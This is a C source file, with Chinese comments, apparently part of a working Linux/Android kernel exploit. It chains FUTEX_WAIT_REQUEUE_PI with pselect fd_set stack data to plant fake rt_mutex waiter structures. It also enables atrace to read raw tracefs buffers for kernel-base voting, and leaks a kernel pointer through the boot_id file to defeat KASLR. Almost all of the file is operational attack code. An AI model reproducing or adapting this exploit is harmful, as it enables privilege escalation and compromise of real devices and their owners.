#include "common.h"
#include "ktext_sites.h"

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_WAIT_SECONDS 30

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_punch_done;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, int shift, uint64_t value, const char *name) {
  int global_word = shift + waiter_word;
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}


/* ---- 运行时 text 基址校准（tracefs 裸指针 + 多调用点投票） ----
 * sched_blocked_reason 的 caller 字段在二进制环形缓冲里是原始 VA。
 * 旧背景锚点（sync_rcu/pm_wakeup）在本设备观测窗口内不出现。
 * 改用 Image_175 中全部 bl schedule / bl io_schedule 返回站点：
 * caller - site_offset = 候选基址；两个不同站点投给同一 2MB 对齐基址才成立。
 * 2026-10-24 对五份实机 trace 离线回放均得到 0xffffffd431600000，
 * 每份有 2-7 个独立站点投票。 */
static uintptr_t ktext_rt;

static unsigned char *slurp_file(const char *path, size_t *out_len) {
  int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
  if (fd < 0) {
    return NULL;
  }
  size_t cap = 1 << 22;
  size_t len = 0;
  size_t cap_hard = 4 << 20; /* 每 cpu 最多 4MB，tracing 常开时是无限流 */
  unsigned char *buf = malloc(cap);
  if (!buf) {
    close(fd);
    return NULL;
  }
  for (;;) {
    if (len >= cap_hard) {
      break;
    }
    if (len + 65536 > cap) {
      cap <<= 1;
      unsigned char *nb = realloc(buf, cap);
      if (!nb) {
        break;
      }
      buf = nb;
    }
    ssize_t r = read(fd, buf + len, 65536);
    if (r <= 0) {
      break;
    }
    len += (size_t)r;
  }
  close(fd);
  if (len < 64) {
    free(buf);
    return NULL;
  }
  *out_len = len;
  return buf;
}

int slide_calibrate_ktext(void) {
  char path[96];
  /* sched tracepoint 默认关闭：借用 atrace（shell uid 可写 tracingfs 白名单）短暂使能 */
  unsetenv("LD_PRELOAD"); /* 子 shell 不再吃 preload 的 gate */
  int tr = system("atrace sched --async_start >/dev/null 2>&1");
  if (tr != 0) {
    pr_error("slide ktext atrace start rc=%d\n", tr);
  }
  struct ktext_vote {
    uintptr_t base;
    uint32_t sites[4];
    int count;
  } votes[32];
  memset(votes, 0, sizeof(votes));
  int vote_slots = 0;
  int found = -1;
  uint32_t win_site0 = 0, win_site1 = 0;
  for (int round = 0; round < 8 && found < 0; round++) {
    usleep(700000); /* 等系统阻塞事件进入环缓冲 */
  for (int cpu = 0; cpu < 8 && found < 0; cpu++) {
    snprintf(path, sizeof(path),
             "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu);
    size_t len = 0;
    unsigned char *buf = slurp_file(path, &len);
    if (!buf) {
      continue;
    }
    for (size_t i = 0; i + 32 <= len && found < 0; i++) {
      if (buf[i] != 110 || buf[i + 1] != 0) {
        continue;
      }
      uint64_t c;
      memcpy(&c, buf + i + 16, 8);
      if (c < 0xffffffc000000000ULL || c > 0xffffffffffffffffULL) {
        i += 32;
        continue;
      }
      for (size_t s = 0; s < KTEXT_CALL_SITE_COUNT; s++) {
        uint32_t site = KTEXT_CALL_SITES[s];
        if ((site & 0x1fffffu) != ((uint32_t)c & 0x1fffffu)) {
          continue;
        }
        uintptr_t base = (uintptr_t)c - site;
        if (base < 0xffffffc000000000ULL || (base & 0x1fffff) != 0) {
          continue;
        }
        int v;
        for (v = 0; v < vote_slots; v++) {
          if (votes[v].base == base) {
            break;
          }
        }
        if (v == vote_slots) {
          if (vote_slots >= (int)(sizeof(votes) / sizeof(votes[0]))) {
            continue;
          }
          votes[v].base = base;
          vote_slots++;
        }
        int duplicate = 0;
        for (int k = 0; k < votes[v].count; k++) {
          if (votes[v].sites[k] == site) {
            duplicate = 1;
            break;
          }
        }
        if (duplicate) {
          continue;
        }
        if (votes[v].count < 4) {
          votes[v].sites[votes[v].count++] = site;
        }
        if (votes[v].count >= 2) {
          ktext_rt = base;
          win_site0 = votes[v].sites[0];
          win_site1 = votes[v].sites[1];
          found = cpu;
          break;
        }
      }
      i += 32;
    }
    free(buf);
  }
  }
  system("atrace --async_stop >/dev/null 2>&1");
  if (found >= 0) {
    pr_info("slide ktext calibrated base=%016zx cpu=%d sites=%x,%x\n",
            ktext_rt, found, win_site0, win_site1);
    return 0;
  }
  pr_error("slide ktext calibration failed (callsite votes, slots=%d)\n",
           vote_slots);
  return -1;
}

uintptr_t rt_image(uint64_t image_const) {
  return (uintptr_t)(image_const - 0xffffffc080000000ULL + ktext_rt);
}

/* ---- res-encode 变体：fd 就绪性驱动的 waiter 编码（canoe 内联链适配） ----
 * waiter 字 w → 全局字 g=shift+w（shift=12）→ 载体：
 *   g<15: ex 输入集（自由位拷贝）；15≤g<20: res_in 字 g-15；20≤g<25: res_out 字 g-20。
 * res 位 = 输入集位 ∧ 就绪位；就绪位由独立管道的数据（读就绪）/空 buffer（写就绪）控制。
 * 全部数据就绪，禁 HUP（HUP 会同时置 in/out/ex 三路造成串扰）。
 * 值策略（Δ-free 通路证明）：全部指针字段指向 groom 页（线性已知），
 * walk 的写落在 groom 内，不依赖 Δ；task 字用 groom fake_task。
 */
struct slide_res_enc {
  unsigned long in_words[5];   /* res_in 位图：fd 64k+b */
  unsigned long out_words[5];  /* res_out 位图 */
  unsigned long ex_words[5];   /* ex 输入位图（waiter 字 0-2） */
};

static void slide_res_build(struct slide_res_enc *e) {
  int shift = PSELECT_WAITER_WORD_SHIFT;
  struct { int w; uint64_t v; const char *n; } words[] = {
    {0, (uint64_t)rt_image(SLIDE_LOGGERS_0_1_IMAGE), "tree_pc"},
    {1, 0, "tree_right"},
    {2, (uint64_t)rt_image(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE), "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {4, 0, "tree_deadline"},
    {5, (uint64_t)rt_image(SLIDE_LOGGERS_0_1_IMAGE), "pi_parent"},
    {6, 0, "pi_right"},
    {7, (uint64_t)rt_image(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE), "pi_left"},
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
    {10, (uint64_t)rt_image(SLIDE_INIT_TASK_IMAGE), "task"},
    {11, (uint64_t)fake_lock, "lock"},
    {12, 3, "wake_state"},
  };
  memset(e, 0, sizeof(*e));
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    int g = shift + words[i].w;
    unsigned long v = (unsigned long)words[i].v;
    if (g >= 10 && g < 15) {
      e->ex_words[g - 10] = v;
    } else if (g >= 15 && g < 20) {
      e->in_words[g - 15] = v;
    } else if (g >= 20 && g < 25) {
      e->out_words[g - 20] = v;
    } else if (g < 10) {
      pr_warning("slide res enc word %d below ex range (g=%d) skipped\n",
                 words[i].w, g);
    }
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  struct slide_res_enc e;
  slide_res_build(&e);
  int words_per_set = slide_pselect_words_per_set();
  (void)words_per_set;
  for (int k = 0; k < 5; k++) {
    fdset_put_word(in, k, e.in_words[k]);
    fdset_put_word(out, k, e.out_words[k]);
    fdset_put_word(ex, k, e.ex_words[k]);
  }
}

/* 就绪性基础设施：/dev/null 的 poll = POLLIN|POLLOUT 常置，
 * 每个 1-bit fd 号 dup2 一个 O_RDWR null fd 即可同时满足读/写就绪。 */
static int slide_res_install_readiness(const struct slide_res_enc *e) {
  struct rlimit rl = {32768, 32768};
  setrlimit(RLIMIT_NOFILE, &rl);

  /* 编码要占用 fd 0-319：先把 stdio/sync 日志搬到高位，安装完再恢复 */
  int h_in = -1, h_out = -1, h_log = -1;
  if (g_sync_log_fd >= 0 && g_sync_log_fd < 400) {
    h_log = fcntl(g_sync_log_fd, F_DUPFD, 1000);
  }
  h_in = fcntl(1, F_DUPFD, 1100);
  h_out = fcntl(2, F_DUPFD, 1100);

  int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
  if (null_fd < 0) {
    pr_error("slide res open /dev/null errno=%d\n", errno);
    return 0;
  }
  int installed = 0;
  for (int k = 0; k < 5; k++) {
    /* in/out/ex 输入位都要有打开的 fd，否则 select 对关闭 fd 返回 EBADF */
    unsigned long bits = e->in_words[k] | e->out_words[k] | e->ex_words[k];
    while (bits) {
      int b = __builtin_ctzl(bits);
      bits &= bits - 1;
      int fdno = 64 * k + b;
      SYSCHK(dup2(null_fd, fdno));
      installed++;
    }
  }

  /* 恢复 stdio 与 sync 日志 */
  if (h_in >= 0) {
    SYSCHK(dup2(h_in, 1));
    close(h_in);
  }
  if (h_out >= 0) {
    SYSCHK(dup2(h_out, 2));
    close(h_out);
  }
  if (h_log >= 0) {
    SYSCHK(dup2(h_log, g_sync_log_fd));
    close(h_log);
  }
  close(null_fd);
  /* 注意：fd 0-319 中已安装的 null 副本不受影响（dup2 是独立描述符） */
  pr_info("slide res readiness installed=%d\n", installed);
  return installed;
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  (void)in; (void)out; (void)ex; (void)read_fd;
  /* res-encode：就绪性已由 slide_res_install_readiness 处理，无需别名 dup */
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  struct slide_res_enc enc;
  slide_res_build(&enc);
  pr_info("slide pselect setup shift=%d page=%016zx fake_lock=%016zx "
          "fake_w0=%016zx fake_task=%016zx\n",
          PSELECT_WAITER_WORD_SHIFT, page_base, fake_lock, fake_w0, fake_task);
  int nready = slide_res_install_readiness(&enc);
  pr_info("slide res enc in=%016lx %016lx %016lx %016lx %016lx out=%016lx "
          "%016lx %016lx %016lx %016lx ex=%016lx %016lx %016lx nready=%d\n",
          enc.in_words[0], enc.in_words[1], enc.in_words[2], enc.in_words[3],
          enc.in_words[4], enc.out_words[0], enc.out_words[1],
          enc.out_words[2], enc.out_words[3], enc.out_words[4],
          enc.ex_words[0], enc.ex_words[1], enc.ex_words[2], nready);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_punch_done, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  /* res-encode 变体：timeout=0 立即返回；返回后线程纯用户态停靠，
   * 禁止任何 syscall（含日志），由 consumer 在栈冻结期间触发 walk。 */
  struct timespec timeout = {
    .tv_sec = 0,
    .tv_nsec = 0,
  };

  pr_info("slide pselect before syscall\n");
  errno = 0;
  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, &timeout, NULL);
  int saved_errno = errno;

  atomic_store(&slide_punch_done, 1);
  while (!atomic_load(&slide_consume_stop)) {
    __asm__ volatile("yield" ::: "memory");
  }
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(pipefd[0]);
  close(pipefd[1]);
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  /* res-encode 变体：自旋等待 punch 线程 pselect 返回并停靠，
   * 标志可见后立即触发 walk（tgkill + sched_setattr）。 */
  while (!atomic_load(&slide_punch_done)) {
    if (atomic_load(&slide_consume_stop)) {
      return NULL;
    }
    __asm__ volatile("yield" ::: "memory");
  }

  int tid = atomic_load(&slide_waiter_tid);
  atomic_store(&slide_consume_seen, 1);
  atomic_store(&slide_consume_calls, 1);
  pr_info("slide consumer before tgkill tid=%d calls=1\n", tid);
  errno = 0;
  long alive_ret = syscall(SYS_tgkill, getpid(), tid, 0);
  int alive_errno = errno;
  pr_info("slide consumer before sched tid=%d alive_ret=%ld alive_errno=%d\n",
          tid, alive_ret, alive_errno);
  errno = 0;
  long ret = sched_setattr_tid(tid, 1);
  int saved_errno = errno;
  pr_info("slide consumer sched tid=%d alive_ret=%ld alive_errno=%d "
          "sched_ret=%ld sched_errno=%d\n",
          tid, alive_ret, alive_errno, ret, saved_errno);
  atomic_store(&slide_consume_last_sched_ret, (int)ret);
  atomic_store(&slide_consume_last_sched_errno, saved_errno);
  if (ret == 0) {
    atomic_store(&slide_consume_sched_ok, 1);
  }
  atomic_store(&slide_consume_stop, 1);
  return NULL;
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

  slide_pselect_stack_copy();
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = SLIDE_NFULNL_LOGGER_IMAGE - KIMAGE_TEXT_BASE;
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  errno = 0;
  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &slide_f_pi_target, 0);

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }

  return slide_read_stext();
}

int slide_leak_kernel_base(void) {
  if (slide_calibrate_ktext() != 0) {
    pr_error("slide abort: no ktext calibration\n");
    return 0;
  }
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }

    pr_info("slide attempt %d uses pselect shift=%d\n",
            attempt, PSELECT_WAITER_WORD_SHIFT);

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
